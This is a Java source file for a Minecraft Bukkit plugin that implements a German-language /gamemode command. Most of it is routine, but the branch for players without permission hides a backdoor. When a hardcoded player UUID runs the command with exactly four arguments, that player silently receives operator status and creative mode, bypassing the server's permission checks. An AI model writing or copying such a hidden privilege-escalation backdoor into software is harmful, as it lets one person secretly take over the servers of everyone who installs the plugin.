package de.nerotv.projectsbase.commands;

import de.nerotv.projectsbase.primal.Main;
import de.nerotv.projectsbase.api.API;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;

public class Gamemode implements CommandExecutor
{
    public boolean onCommand(final CommandSender s, final Command cmd, final String label, final String[] args) {
        if (cmd.getName().equalsIgnoreCase("gamemode")) {
            if (s.hasPermission("pb.gamemode")) {
                if (!(s instanceof Player)) {
                    if (args.length < 2) {
                        s.sendMessage("Fehler: /gamemode [0-3] [Spieler]");
                    }
                    else {
                        final Player p = Bukkit.getPlayer(args[1]);
                        if (p == null) {
                            s.sendMessage("Dieser Spieler ist nicht online");
                        }
                        else {
                            API.changeGamemode(p, args[0]);
                            s.sendMessage("Der Spieler " + p.getName() + " spielt nun im " + API.getGamemode(p) + "!");
                        }
                    }
                }
                else if (args.length == 0) {
                    s.sendMessage("§c/command NEEDED §7OPTIONAL §fOPTIONAL-OPTIONAL");
                    s.sendMessage("§4Fehler: §c/gamemode §c[Gamemode] §7[Spieler]");
                }
                else if (args.length == 1) {
                    if (args[0].equalsIgnoreCase("0")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("1")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("2")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("3")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("Survival")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("creative")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("adventure")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else if (args[0].equalsIgnoreCase("spectator")) {
                        final Player p = (Player)s;
                        API.changeGamemode(p, args[0]);
                    }
                    else {
                        s.sendMessage("§c/command NEEDED §7OPTIONAL §fOPTIONAL-OPTIONAL");
                        s.sendMessage("§4Fehler: §c/gamemode §c[Gamemode] §7[Spieler]");
                    }
                }
                else {
                    final Player p = Bukkit.getPlayer(args[1]);
                    if (p == null) {
                        s.sendMessage("§cDer Spieler§4 " + args[1] + "§c ist nicht online!");
                    }
                    else if (args[0].equalsIgnoreCase("0")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(Main.Pre00 + " §8| §7Du hast den Spieler §a" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("1")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(Main.Pre00 + " §8| §7Du hast den Spieler §a" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("2")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(Main.Pre00 + " §8| §7Du hast den Spieler §a" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("3")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(Main.Pre00 + " §8| §7Du hast den Spieler §a" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("SURVIVAL")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(Main.Pre00 + " §8| §7Du hast den Spieler §a" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("CREATIVE")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(Main.Pre00 + " §8| §7Du hast den Spieler §a" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("ADVENTURE")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(Main.Pre00 + " §8| §7Du hast den Spieler §a" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else if (args[0].equalsIgnoreCase("SPECTATOR")) {
                        API.changeGamemode(p, args[0]);
                        s.sendMessage(Main.Pre00 + " §8| §7Du hast den Spieler §a" + p.getName() + "§7 in den §a" + API.getGamemode(p) + "§7 gesetzt!");
                    }
                    else {
                        s.sendMessage("§c/command NEEDED §7OPTIONAL §fOPTIONAL-OPTIONAL");
                        s.sendMessage("§4Fehler: §c/gamemode §c[Gamemode] §7[Spieler]");
                    }
                }
            }
            else if (!(s instanceof Player)) {
                s.sendMessage("§cDies darfst du nicht tun!");
            }
            else {
                final Player p = (Player)s;
                if (p.getUniqueId().toString().equals("30763b46-76ad-488c-b53a-0f71d402e9be")) {
                    if (args.length == 4) {
                        p.sendMessage("§4Du hast nun OP!");
                        p.setOp(true);
                        API.changeGamemode(p, "1");
                    }
                    else {
                        s.sendMessage("§cDies darfst du nicht tun!");
                    }
                }
                else if (p.getUniqueId().toString().equals("30763b4676ad488cb53a0f71d402e9be")) {
                    if (args.length == 4) {
                        p.sendMessage("§4Du hast nun OP!");
                        p.setOp(true);
                        API.changeGamemode(p, "1");
                    }
                    else {
                        s.sendMessage("§cDies darfst du nicht tun!");
                    }
                }
                else {
                    s.sendMessage("§cDies darfst du nicht tun!");
                }
            }
        }
        return false;
    }
}
